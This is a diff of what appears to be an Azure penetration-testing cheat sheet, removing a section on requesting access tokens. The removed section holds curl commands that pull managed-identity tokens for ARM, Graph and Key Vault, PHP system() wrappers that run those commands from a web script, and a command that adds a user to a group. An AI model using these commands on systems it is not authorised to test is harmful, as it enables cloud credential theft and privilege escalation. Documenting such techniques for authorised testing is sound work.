@@ -29,63 +29,6 @@
   * [Updateable groups](#Updateable-groups)
 
 ## General
-### Requesting access tokens
-#### Curl
-- ARM
-```
-curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
-```
-
-- Azure AD Graph
-```
-curl "$IDENTITY_ENDPOINT?resource=https://graph.windows.net/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
-```
-
-- Microsoft Graph
-```
-curl "$IDENTITY_ENDPOINT?resource=https://graph.microsoft.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
-```
-
-- Keyvault
-```
-curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
-```
-
-### PHP
-- ARM
-```
-<?php
-  system ('curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com&api-version=2017-09-01" -H secret:$IDENTITY_HEADER');
-?>
-```
-
-- Azure AD Graph
-```
-<?php
-  system ('curl "$IDENTITY_ENDPOINT?resource=https://graph.windows.net/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER');
-?>
-```
-
-- Microsoft Graph
-```
-<?php
-  system ('curl "$IDENTITY_ENDPOINT?resource=https://graph.microsoft.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER');
-?>
-```
-
-- Keyvault
-```
-<?php
-  system ('curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2017-09-01" -H secret:$IDENTITY_HEADER');
-?>
-```
-
-#### Add a user to a group
-- Required aad-graph token
-```
-Add-AzureADGroupMember -ObjectId <GROUP ID> -RefObjectId <USER ID> -Verbose
-```
-
 ## Exploitation Enumeration
 ### When on a new machine
 ### Get machine info
